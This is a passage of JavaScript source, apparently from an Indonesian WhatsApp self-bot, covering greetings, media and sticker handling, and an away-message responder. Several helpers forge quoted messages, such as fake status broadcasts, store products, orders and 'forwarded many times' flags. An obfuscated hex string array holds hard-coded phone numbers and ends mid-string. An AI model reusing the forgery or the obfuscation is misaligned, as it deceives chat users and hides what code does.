		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const ratee = ["106","106","106","106","106","106","106"]
        const tee = ratee[Math.floor(Math.random() * ratee.length)]
        const rateee = ["Dj storongest jedag jedug 30 s","Dj akimilaku remix terbaru 2021 30 s","Dj campuran 30 detik","Dj sidro 2  style Thailand viral 30 s","Dj disitu enak susu akimilaku 30 s","Dj zombie x melody stres love 30 s","Dj numa muma ye style Thailand 30 s","Dj biasalah x bola boma ye 30 s"]
        const srchh = rateee[Math.floor(Math.random() * rateee.length)]
        const tescuk = ["0@s.whatsapp.net"]
        const alfa = `${targetpc}@s.whatsapp.net`
		const alfa1 = `${targetpc}@s.whatsapp.net`
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = alpha.user.phone
		const status = `${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}`
        const conts = mek.key.fromMe ? alpha.user.jid : alpha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? alpha.user.name : conts.notify || conts.vname || conts.name || '-'
        const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + jam + ":" + menit + ":" + detik ;   
            
            myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
                myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'];
                var tgl = new Date();
                detik = tgl.getSeconds();
                menit = tgl.getMinutes();
                jam = tgl.getHours();
	            var ampm = jam >= 12 ? 'PM' : 'AM';
	            var day = tgl.getDate()
	            bulan = tgl.getMonth()
	            var thisDay = tgl.getDay(),
	            thisDay = myDays[thisDay];
	            var yy = tgl.getYear()
	            var year = (yy < 1000) ? yy + 1900 : yy;
	            const ini_tanggal = `${day} - ${myMonths[bulan]} - ${year}`
            
            var ase = new Date();
            var waktoo = ase.getHours();
            switch(waktoo){
                case 0: waktoo = "Selamat Malam 🌚"; break;
                case 1: waktoo = "Selamat Malam 🌚"; break;
                case 2: waktoo = "Selamat Malam 🌚"; break;
                case 3: waktoo = "Selamat Malam 🌚"; break;
                case 4: waktoo = "Selamat Pagi 🌞"; break;
                case 5: waktoo = "Selamat Pagi 🌞"; break;
                case 6: waktoo = "Selamat Pagi 🌞"; break;
                case 7: waktoo = "Selamat Pagi 🌞"; break;
                case 8: waktoo = "Selamat Pagi 🌞"; break;
                case 9: waktoo = "Selamat Pagi 🌞"; break;
                case 10: waktoo = "Selamat Pagi 🌞"; break;
                case 11: waktoo = "Waktu Dzuhur , jangan lupa shalat"; break;
                case 12: waktoo = "Selamat Siang ☀️"; break;
                case 13: waktoo = "Selamat Siang ☀️"; break;
                case 14: waktoo = "Waktu Ashar , jangan lupa shalat"; break;
                case 15: waktoo = "Selamat Sore 🌌"; break;
                case 16: waktoo = "Selamat Sore 🌌"; break;
                case 17: waktoo = "Selamat Sore 🌌"; break;
                case 18: waktoo = "Waktu Magrib, jangan lupa shalat"; break;
                case 19: waktoo = "Waktu Isya, jangan lupa shalat"; break;
                case 20: waktoo = "Selamat Malam 🌃"; break;
                case 21: waktoo = "Selamat Malam 🌃"; break;
                case 22: waktoo = "Selamat Malam 🌃"; break;
                case 23: waktoo = "Selamat Malam 🌃"; break;
            }
            var hahh = "" + waktoo; 
        
          var ase = new Date();
                        var waktoonyabro = ase.getHours();
                        switch(waktoonyabro){
                case 0: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 1: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 2: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 3: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 4: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 5: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 6: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 7: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 8: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 9: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 10: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 11: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 12: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 13: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 14: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 15: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 16: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 17: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 18: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 19: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 20: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 21: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 22: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 23: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
            }
            var ucapannya = "" + waktoonyabro;     
		mess = {
			wait: '```[ ! ] Proses kak...```',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'Itu bukan stiker',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Only Group',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            alpha.sendMessage(from, teks, text, {quoted:mek, thumbnail: fs.readFileSync(`image/${thumbnail}`), contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
        }

        const sendMess = (hehe, teks) => {
            alpha.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }

        const fakestatus = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const fakethumb = (teks, yes) => {
            alpha.sendMessage(from, teks, image, {thumbnail:fs.readFileSync(`./image/${thumbnail}`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`image/${thumbnail}`) //Gambarnye
					},
					"title": 'Whatsapp bot', 
					"description": "SELF BOT", 
					"currencyCode": "IDR",
					"priceAmount1000": "70000000",
					"retailerId": 'Whatsapp bot',
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}

        const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`image/${thumbnail}`), surface: 200, message: `${creator}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${creator}`,jpegThumbnail: fs.readFileSync(`image/${thumbnail}`)}}}
        const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
        const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${creator}`,jpegThumbnail: fs.readFileSync(`image/${thumbnail}`)}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`), thumbnail: fs.readFileSync(`image/${thumbnail}`),sendEphemeral: true}}}
		var fakeReplyList = ['ftroli', 'fdoc', 'fvn', 'fgif', 'fgclink', 'fvideo', 'floc', 'fkontak']
		var fakeReply = fakeReplyList[Math.floor(Math.random() * fakeReplyList.length)];

const fakeitem = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`image/${thumbnail}`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
           
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        alpha.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    alpha.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, mek, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return alpha.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return alpha.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync(`image/${thumbnail}`)})
        }
        
  //FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
          }
        }
            }
          }
        }
      }
    }
          // FUNTION CHAT \\
      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}

const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await alpha.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}  

let ii = []
				let giid = []
				for (mem of totalchat){
					ii.push(mem.jid)
				}
				for (id of ii){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                const  timestampi = speed();
				const  latensii = speed() - timestampi
				const latensiii = `${latensii.toFixed(4)} _Second_`
				const ini_gcchat = `${giid.length}`
				const uptime = process.uptime()
			    const tekss = `${kyun(uptime)}`
			    const ini_totalchat = `${totalchat.length - giid.lenght}`

const replyy = (teks) => {
			alpha.sendMessage(from, teks, sticker, { quoted: fgclink })
		}
/////
 for (let zeeone of setiker){
	if (budy === zeeone){
		result = fs.readFileSync(`./media/sticker/${zeeone}.webp`)
		alpha.sendMessage(from, result,sticker, {quoted : ftroli})
		}
}
for (let zeeonee of audionye){
	if (budy === zeeonee){
		result = fs.readFileSync(`./media/audio/${zeeonee}.mp3`)
		alpha.sendMessage(from, result, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true, quoted : ftroli})
		}
}
for (let zeeoneee of imagenye){
	if (budy === zeeoneee){
		result = fs.readFileSync(`./media/foto/${zeeoneee}.jpg`)
		alpha.sendMessage(from, result,image, {quoted : ftroli})
		}
}
for (let zeeonew of videonye){
	if (budy === zeeonew){
		result = fs.readFileSync(`./media/video/${zeeonew}.mp4`)
		alpha.sendMessage(from, result,video, {mimetype: 'video/mp4', duration: 359996400, quoted: ftroli})
		}
}    
////   
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (!mek.key.fromMe && banChats === true) return
		var _0x2363=["\x73\x74\x69\x63\x6B\x65\x72\x4D\x65\x73\x73\x61\x67\x65","\x6D\x65\x73\x73\x61\x67\x65","\x61\x75\x64\x69\x6F\x4D\x65\x73\x73\x61\x67\x65","\x69\x6D\x61\x67\x65\x2F","","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\x36\x32\x38\x38\x32\x37\x39\x35\x37\x35\x35\x31\x33\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x36\x32\x38\x35\x37\x31\x36\x33\x36\x30\x35\x31\x32\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x66\x69\x6C\x65\x4C\x65\x6E\x67\x74\x68","\x2E\x6A\x70\x67","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x6E\x65\x6F\x66\x65\x74\x63\x68\x20\x2D\x2D\x73\x74\x64\x6F\x75\x74","\x75\x74\x66\x2D\x38","\x52\x61\x6D\x3A","\x72\x65\x70\x6C\x61\x63\x65","\x2A","\x53\x70\x65\x65\x64\x3A\x20","\x74\x6F\x46\x69\x78\x65\x64","\x20\x53\x65\x63\x6F\x6E\x64\x2A","\x69\x6D\x61\x67\x65","\x70\x72\x65\x70\x61\x72\x65\x4D\x65\x73\x73\x61\x67\x65","\x6D\x65\x6E\x75","\uD835\uDC0C\uD835\uDC04\uD835\uDC0D\uD835\uDC14","\x6F\x77\x6E\x65\x72","\uD835\uDC0E\uD835\uDC16\uD835\uDC0D\uD835\uDC04\uD835\uDC11","\x73\x74\x61\x74\x75\x73","\uD835\uDC01\uD835\uDC0E\uD835\uDC13\x20\uD835\uDC12\uD835\uDC13\uD835\uDC00\uD835\uDC13\uD835\uDC14\uD835\uDC12","\x48\x61\x6C\x6F\x20\x6B\x61\x6B\x20","\x20\x73\x61\x79\x61\x20\x61\x64\x61\x6C\x61\x68\x20\x62\x6F\x74\x20\x77\x68\x61\x74\x73\x61\x70\x70\x20\x79\x61\x6E\x67\x20\x73\x69\x61\x70\x20\x6D\x65\x6D\x62\x61\x6E\x74\x75\x20\x6B\x6B","\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65","\x62\x75\x74\x74\x6F\x6E\x73\x4D\x65\x73\x73\x61\x67\x65","\x42\x6F\x74\x77\x65\x61\x20\xA9\x32\x6B\x32\x31","\x68\x69","\x20","\x50\x48\x4F\x54\x4F","\x66\x72\x6F\x6D\x4D\x65","\x6B\x65\x79","\x60\x60\x60\x4F\x57\x4E\x45\x52\x20\x4F\x4E\x4C\x59\x60\x60\x60","\x75\x70\x74\x69\x6D\x65","\u300C\x20\x2A\x53\x45\x4C\x46\x2D\x4D\x4F\x44\x45\x2A\x20\u300D","\u300C\x20\x2A\x50\x55\x42\x4C\x49\x43\x2D\x4D\x4F\x44\x45\x2A\x20\u300D","\x76\x69\x64\x65\x6F\x4D\x65\x73\x73\x61\x67\x65","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x74\x65\x78\x74\x49\x6E\x66\x6F","\x71\x75\x6F\x74\x65\x64\x4D","\x6D","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x70\x61\x72\x73\x65","\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x41\x6E\x64\x53\x61\x76\x65\x4D\x65\x64\x69\x61\x4D\x65\x73\x73\x61\x67\x65","\x36\x36\x36\x2E\x77\x65\x62\x70","\x73\x61\x76\x65","\x77\x65\x62\x70","\x74\x6F\x46\x6F\x72\x6D\x61\x74","\x2D\x76\x63\x6F\x64\x65\x63","\x6C\x69\x62\x77\x65\x62\x70","\x2D\x76\x66","\x73\x63\x61\x6C\x65\x3D\x27\x6D\x69\x6E\x28\x33\x32\x30\x2C\x69\x77\x29\x27\x3A\x6D\x69\x6E\x27\x28\x33\x32\x30\x2C\x69\x68\x29\x27\x3A\x66\x6F\x72\x63\x65\x5F\x6F\x72\x69\x67\x69\x6E\x61\x6C\x5F\x61\x73\x70\x65\x63\x74\x5F\x72\x61\x74\x69\x6F\x3D\x64\x65\x63\x72\x65\x61\x73\x65\x2C\x66\x70\x73\x3D\x31\x35\x2C\x20\x70\x61\x64\x3D\x33\x32\x30\x3A\x33\x32\x30\x3A\x2D\x31\x3A\x2D\x31\x3A\x63\x6F\x6C\x6F\x72\x3D\x77\x68\x69\x74\x65\x40\x30\x2E\x30\x2C\x20\x73\x70\x6C\x69\x74\x20\x5B\x61\x5D\x5B\x62\x5D\x3B\x20\x5B\x61\x5D\x20\x70\x61\x6C\x65\x74\x74\x65\x67\x65\x6E\x3D\x72\x65\x73\x65\x72\x76\x65\x5F\x74\x72\x61\x6E\x73\x70\x61\x72\x65\x6E\x74\x3D\x6F\x6E\x3A\x74\x72\x61\x6E\x73\x70\x61\x72\x65\x6E\x63\x79\x5F\x63\x6F\x6C\x6F\x72\x3D\x66\x66\x66\x66\x66\x66\x20\x5B\x70\x5D\x3B\x20\x5B\x62\x5D\x5B\x70\x5D\x20\x70\x61\x6C\x65\x74\x74\x65\x75\x73\x65","\x61\x64\x64\x4F\x75\x74\x70\x75\x74\x4F\x70\x74\x69\x6F\x6E\x73","\x65\x6E\x64","\x46\x69\x6E\x69\x73\x68","\x6C\x6F\x67","\x75\x6E\x6C\x69\x6E\x6B\x53\x79\x6E\x63","\x6F\x6E","\x65\x72\x72\x6F\x72","\x45\x72\x72\x6F\x72\x20\x3A\x20","\x73\x74\x61\x72\x74","\x53\x74\x61\x72\x74\x65\x64\x20\x3A\x20","\x69\x6E\x70\x75\x74","\x2E\x2F","\x73\x65\x63\x6F\x6E\x64\x73","\x71\x75\x6F\x74\x65\x64\x4D\x65\x73\x73\x61\x67\x65","\x39\x39\x39\x2E\x77\x65\x62\x70","\x77\x61\x69\x74","\x2E\x6D\x70\x34","\x65\x6E\x64\x73\x57\x69\x74\x68","\x76\x69\x64\x65\x6F","\x67\x69\x66","\x47\x61\x67\x61\x6C\x2C\x20\x70\x61\x64\x61\x20\x73\x61\x61\x74\x20\x6D\x65\x6E\x67\x6B\x6F\x6E\x76\x65\x72\x73\x69\x20","\x20\x6B\x65\x20\x73\x74\x69\x6B\x65\x72","\x2E","\x73\x70\x6C\x69\x74","\x69\x6E\x70\x75\x74\x46\x6F\x72\x6D\x61\x74","\x4B\x69\x72\x69\x6D\x20\x67\x61\x6D\x62\x61\x72\x20\x64\x65\x6E\x67\x61\x6E\x20\x63\x61\x70\x74\x69\x6F\x6E\x20","\x73\x74\x69\x63\x6B\x65\x72\x5C\x6E\x44\x75\x72\x61\x73\x69\x20\x53\x74\x69\x63\x6B\x65\x72\x20\x56\x69\x64\x65\x6F\x20\x31\x2D\x39\x20\x44\x65\x74\x69\x6B","\x52\x65\x70\x6C\x79\x20\x61\x74\x61\x75\x20\x74\x61\x67\x20\x73\x74\x69\x6B\x65\x72\x20\x6E\x79\x61\x20\x6C\x6F\x72\x64\x21","\x60\x60\x60\x50\x52\x4F\x53\x45\x53\x2E\x2E\x2E\x60\x60\x60","\x2E\x70\x6E\x67","\x66\x66\x6D\x70\x65\x67\x20\x2D\x69\x20","\x59\x61\x68\x20\x67\x61\x67\x61\x6C\x2C\x20\x63\x6F\x62\x61\x20\x75\x6C\x61\x6E\x67\x69\x20\x5E\x5F\x5E","\x53\x75\x70\x70\x6F\x72\x74\x20\x5A\x45\x45\x4F\x4E\x45\x20\x4F\x46\x